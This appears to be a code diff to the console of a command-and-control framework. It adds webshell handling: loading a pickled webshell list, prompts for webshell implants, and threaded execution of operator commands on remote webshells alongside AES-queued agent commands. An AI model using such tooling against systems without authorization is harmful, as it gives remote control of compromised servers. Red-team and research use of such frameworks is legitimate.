@@ -4,6 +4,7 @@ import readline
 import sys
 import time
 from core import config
+from core import webshell
 import os
 from pathlib import Path
 
@@ -26,6 +27,9 @@ from core.Encryption import *
 from core.config import AESKey
 #import urllib2
 import threading
+import _thread
+import time
+
 def signal_handler(sig, frame):
         print('Exit by typing exit')
         #sys.exit(0)
@@ -88,23 +92,40 @@ def main():
     donut_shellcode()
     f=open(".history","a").write("\n")
     readline.read_history_file(".history")
-
+    try:
+        print("loading registered webshell list")
+        with open('.webshells', 'rb') as f:
+            config.WEBSHELLS = pickle.load(f)
+    except:
+        print("webshell list file doesn't exist.")
     while True:
         readline.set_completer(Command_Completer)
         readline.parse_and_bind("tab: complete")
         readline.write_history_file(".history")
         if config.POINTER == 'main':
             command = input('(%s : %s) ' % (config.BASE, config.POINTER))
-        else:
+        elif config.POINTER == 'webshell':
+            command = input('(%s : %s) ' % (config.BASE, config.POINTER))
+        elif config.Implant_Type=='agent':
             command = input('(%s : Agent(%s)-%s) ' % (config.BASE, str(config.AGENTS[config.POINTER][0]),bcolors.FAIL + config.AGENTS[config.POINTER][5] + bcolors.ENDC ))
+        elif config.Implant_Type=='webshell':
+            command = input('(%s : webshell(%s)@%s) ' % (config.BASE, str(config.WEBSHELLS[config.POINTER][0]),bcolors.FAIL + config.WEBSHELLS[config.POINTER][1]+ bcolors.ENDC ))
         bcommand = command.strip().split()
+
         if bcommand:
             if bcommand[0] in cmd.COMMANDS:
                 result = getattr(globals()['cmd'](), bcommand[0])(bcommand)
-            elif bcommand[0] not in cmd.COMMANDS and config.POINTER != 'main':
+            elif bcommand[0] not in cmd.COMMANDS and config.POINTER != 'main' and config.POINTER != 'webshell' and config.Implant_Type=='agent':
                 config.COMMAND[config.POINTER].append(encrypt(AESKey,command.strip()))
 
+            elif bcommand[0] not in cmd.COMMANDS and config.POINTER != 'main' and config.POINTER != 'webshell' and config.Implant_Type=='webshell':
 
+                #webshell.webshell_execute(config.WEBSHELLS[config.POINTER],command.strip())
+                try:
+                    _thread.start_new_thread( webshell.webshell_execute, (config.WEBSHELLS[config.POINTER],command.strip(), ) )
+
+                except:
+                    print ("Error: unable to start thread")
 if __name__ == '__main__':
     try :
         main()
